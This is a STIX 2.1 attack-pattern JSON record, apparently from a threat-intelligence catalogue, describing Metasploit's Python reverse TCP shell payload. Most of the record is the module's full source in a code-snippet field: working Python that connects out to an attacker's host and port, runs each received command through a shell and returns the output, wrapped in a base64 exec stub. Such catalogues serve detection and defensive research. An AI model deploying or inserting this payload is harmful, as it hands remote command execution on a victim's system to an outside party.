{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3a5e7f3c-c5f1-46c9-a1d4-e51fc3155112",
    "created": "2024-08-14T16:33:19.396631Z",
    "modified": "2024-08-14T16:33:19.396635Z",
    "name": "Command Shell, Reverse TCP (via python)",
    "description": "Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/python/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Python\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Command Shell, Reverse TCP (via python)',\n      'Description'   => 'Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.',\n      'Author'        => 'Ben Campbell', # Based on RageLtMan's reverse_ssl\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'python',\n      'Arch'          => ARCH_PYTHON,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShell,\n      'PayloadType'   => 'python',\n      'Payload'       =>\n        {\n          'Offsets' => { },\n          'Payload' => ''\n        }\n      ))\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    cmd = <<~PYTHON\n      import socket as s\n      import subprocess as r\n      so=s.socket(s.AF_INET,s.SOCK_STREAM)\n      so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n      while True:\n      \td=so.recv(1024)\n      \tif len(d)==0:\n      \t\tbreak\n      \tp=r.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)\n      \to=p.stdout.read()+p.stderr.read()\n      \tso.send(o)\n    PYTHON\n\n    py_create_exec_stub(cmd)\n  end\nend\n\n",
    "x_mitre_platforms": [
        "python'"
    ]
}